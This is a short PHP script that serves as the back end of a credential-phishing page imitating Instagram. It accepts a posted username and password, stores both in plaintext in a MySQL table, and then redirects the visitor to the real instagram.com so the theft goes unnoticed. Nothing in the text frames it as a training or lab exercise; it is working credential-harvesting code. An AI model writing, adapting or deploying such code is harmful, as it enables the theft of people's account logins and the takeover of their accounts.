<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? '';
    $password = $_POST["password"] ?? '';

    $username = trim($username);
    $password = trim($password);

    if ($username === '' || $password === '') {
        header("Location: https://www.instagram.com/");
        exit;
    }

    // ── Your database connection ────────────────────────────────
    $host = 'localhost';
    $db   = 'testdb';
    $user = 'root';          // ← change if needed
    $pass = '';              // ← change if needed

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $stmt = $pdo->prepare("INSERT INTO test (username, password) VALUES (?, ?)");
        $stmt->execute([$username, $password]);

    } catch (Exception $e) {
        
        error_log($e->getMessage());  // ← uncomment only for debugging
    }

    header("Location: https://www.instagram.com/");
    exit;
}

header("Location: https://www.instagram.com/");
exit;